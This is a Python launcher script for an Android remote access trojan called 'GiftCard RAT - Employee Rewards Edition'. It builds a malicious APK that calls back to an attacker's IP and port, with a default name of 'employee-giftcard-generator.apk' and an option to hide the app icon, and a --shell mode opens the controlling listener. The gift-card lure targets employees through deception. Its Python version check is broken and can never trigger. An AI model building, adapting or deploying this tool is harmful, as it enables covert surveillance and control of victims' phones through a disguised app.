#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'Server'))
from utils import *
import argparse
import platform
    
clearDirec()

#   _____ _  __ _    _____              _   _____       _______ 
#  / ____(_)/ _| |  / ____|            | | |  __ \   /\|__   __|
# | |  __ _| |_| |_| |     __ _ _ __ __| | | |__) | /  \  | |   
# | | |_ | |  _| __| |    / _` | '__/ _` | |  _  / / /\ \ | |   
# | |__| | | | | |_| |___| (_| | | | (_| | | | \ \/ ____ \| |   
#  \_____|_|_| |_|\__|\_____\__,_|_|  \__,_| |_|  \_/_/    \_\_|   
#                                                                   
#  Android Remote Access Tool - Employee Rewards Edition


parser = argparse.ArgumentParser(usage="%(prog)s [--build] [--shell] [-i <IP> -p <PORT> -o <apk name>]")
parser.add_argument('--build',help='For Building the apk',action='store_true')
parser.add_argument('--shell',help='For getting the Interpreter',action='store_true')
parser.add_argument('-i','--ip',metavar="<IP>" ,type=str,help='Enter the IP')
parser.add_argument('-p','--port',metavar="<Port>", type=str,help='Enter the Port')
parser.add_argument('-o','--output',metavar="<Apk Name>", type=str,help='Enter the apk Name (default: employee-giftcard-generator.apk)')
parser.add_argument('-icon','--icon',help='Hide app icon (icon visible by default)',action='store_true')
args = parser.parse_args()



if float(platform.python_version()[:3]) < 3.6 and float(platform.python_version()[:3]) > 3.8 :
    print(stdOutput("error")+"\033[1mPython version should be between 3.6 to 3.8")
    sys.exit()

if args.build:
    port_ = args.port
    icon=False if args.icon else True  # Reversed: icon visible by default, --icon flag hides it
    if args.ip and args.port:
        build(args.ip,port_,args.output,False,None,icon)
    else:
        print(stdOutput("error")+"\033[1mArguments Missing")

if args.shell:
    if args.ip and args.port:
        get_shell(args.ip,args.port) 
    else:
        print(stdOutput("error")+"\033[1mArguments Missing")
